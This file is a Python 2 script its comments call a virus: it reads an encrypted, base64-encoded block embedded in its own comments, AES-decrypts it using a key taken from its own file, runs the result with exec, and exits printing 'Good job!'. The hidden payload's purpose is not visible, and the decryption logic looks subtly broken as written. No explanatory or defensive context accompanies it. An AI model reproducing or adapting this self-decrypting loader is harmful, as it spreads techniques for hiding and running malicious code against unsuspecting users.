######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted

# Start payload
#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
# End payload